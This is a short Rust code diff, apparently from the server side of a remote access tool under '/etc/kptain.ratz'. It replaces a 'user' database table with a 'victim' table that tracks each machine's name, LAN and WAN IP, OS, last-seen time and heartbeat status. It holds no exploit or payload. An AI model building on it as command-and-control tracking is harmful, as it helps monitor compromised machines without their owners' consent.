@@ -272,18 +272,17 @@ async fn main() -> io::Result<()> {
         File::create("/etc/kptain.ratz/datasave.db")?;
         let conn = Connection::open("/etc/kptain.ratz/datasave.db").unwrap();
         
-        let verif = conn.execute(
-            "CREATE TABLE user (
+        conn.execute(
+            "CREATE TABLE victim (
+            	logo TEXT,
                 id INTEGER PRIMARY KEY,
-                name TEXT,
-                ip TEXT,
-                autre TEXT);",NO_PARAMS,);
-        }
-        match verif{
-            Ok(_n) =>{println!("client already exist");}
-            Err(_) =>{
-                conn.execute("insert into user (name,ip,autre) values (:name,:ip,:port);",&[(":name", &user1.username.to_string() ),(":ip", &croped[0].to_string()),(":port", &croped[1].to_string())],);
-                println!("client added to db");
+                computername TEXT,
+                lanip TEXT,
+                wanip TEXT,
+                os TEXT,
+                lastseen TEXT,
+                hbstatus TEXT);",NO_PARAMS,);           
+                
             }
         }
         
@@ -312,4 +311,3 @@ async fn main() -> io::Result<()> {
         });
         chann_snd.send(username_string).unwrap();
     }
-}
